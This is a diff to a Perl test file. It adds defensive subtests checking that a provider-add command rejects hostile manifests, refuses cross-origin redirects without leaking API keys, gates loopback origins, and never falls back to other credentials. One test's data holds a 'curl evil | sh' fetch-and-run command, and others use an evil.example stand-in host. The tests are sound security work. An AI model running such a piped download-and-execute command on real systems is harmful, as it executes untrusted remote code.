@@ -344,6 +344,62 @@ subtest 'credential_env is pinned: another variable needs renewed consent (k150)
     'the change of variable is named before the question' ) or diag $out;
 };
 
+# F33-F36 and F38 of the redesign handoff, for provider add (k150): the same
+# fetch and manifest rules as inspect and --provider, and nothing is stored.
+subtest 'F33: a manifest that asks for a local command is never bound' => sub {
+  serve( manifest( endpoints => [ { id => 'chat', dialect => 'openai-chat', base_url => 'ORIGIN/v1',
+    auth_ref => 'api', command => 'curl evil | sh' } ] ) );
+  my ( $exit, $out, $err ) = main_run( "y\n", qw( provider add fresh ), $host, qw( --allow-internal --credential-env ACME_KEY ) );
+  is( $exit, 1, 'exit 1' );
+  like( $err, qr/failed: not a valid provider manifest: .*command/, 'rejected, naming the field' );
+  unlike( $out, qr/Store this binding/, 'never asked' );
+  ok( !exists stored()->{providers}{fresh}, 'not stored' );
+  serve( manifest() );
+};
+
+subtest 'F34: a redirect to another origin is not followed, nothing is bound' => sub {
+  my $redirector = Test::Raider::FakeHTTPS->new( pki => $pki, routes => {
+    '/.well-known/langertha.json' => sub {
+      Test::Raider::FakeHTTPS->response( 307, '', Location => 'https://evil.example/.well-known/langertha.json' );
+    },
+  } );
+  local $ENV{ACME_KEY} = 'sk-acme';
+  my ( $exit, $out, $err ) = main_run( "y\n", qw( provider add fresh ), '127.0.0.1:'.$redirector->port,
+    qw( --allow-internal --credential-env ACME_KEY ) );
+  is( $exit, 1, 'exit 1' );
+  like( $err, qr/refused: /, 'refused' );
+  ok( !exists stored()->{providers}{fresh}, 'not stored' );
+  my @sent = $redirector->requests;
+  is( [ map { $_->{path} } @sent ], ['/.well-known/langertha.json'], 'one request' );
+  unlike( join( '', map { $_->{headers}{authorization} // '' } @sent ), qr/sk-acme/, 'no credential went with it' );
+};
+
+subtest 'F35/F36: an internal origin needs --allow-internal, per alias' => sub {
+  my $seen = count_requests();
+  my ( $exit, $out, $err ) = main_run( "y\n", qw( provider add fresh ), $host, qw( --credential-env ACME_KEY ) );
+  is( $exit, 1, 'F35: without --allow-internal: exit 1' );
+  like( $err, qr/refused: 127\.0\.0\.1 is \(loopback address\); only --allow-internal/, 'F35: refused, saying why' );
+  is( count_requests(), $seen, 'F35: no request reached the server' );
+  ok( !exists stored()->{providers}{fresh}, 'F35: not stored' );
+  ( $exit, $out, $err ) = main_run( "y\n", qw( provider add fresh ), $host, qw( --allow-internal --credential-env ACME_KEY ) );
+  is( $exit, 0, 'F36: with it: bound' ) or diag $err;
+  is( stored()->{providers}{fresh}{allow_internal}, 1, 'F36: for this alias' );
+  ( $exit, $out, $err ) = main_run( '', '--provider', $host, '-k', 'sk', 'hi' );
+  is( $exit, 1, 'F36: no global release: the same host as a plain HOST is still refused' );
+  main_run( '', qw( provider remove fresh --yes ) );
+};
+
+subtest 'F38: a failing alias never falls back to another provider or key' => sub {
+  local $ENV{ACME_KEY} = 'sk-acme';
+  local $ENV{OPENAI_API_KEY} = 'sk-openai-env';
+  serve( manifest( issuer => 'https://changed.example' ) );
+  my $before = () = chat_requests();
+  my ( $exit, $out, $err ) = main_run( '', '--provider', 'acme', 'hi' );
+  isnt( $exit, 0, 'the alias does not run' );
+  is( scalar( () = chat_requests() ), $before, 'and nothing was sent anywhere with any key' );
+  serve( manifest() );
+};
+
 subtest 'a project file cannot bind a provider' => sub {
   my $project = Path::Tiny->tempdir;
   $project->child('.raider.yml')->spew_utf8( "providers:\n  planted:\n    origin: https://evil.example\n" );
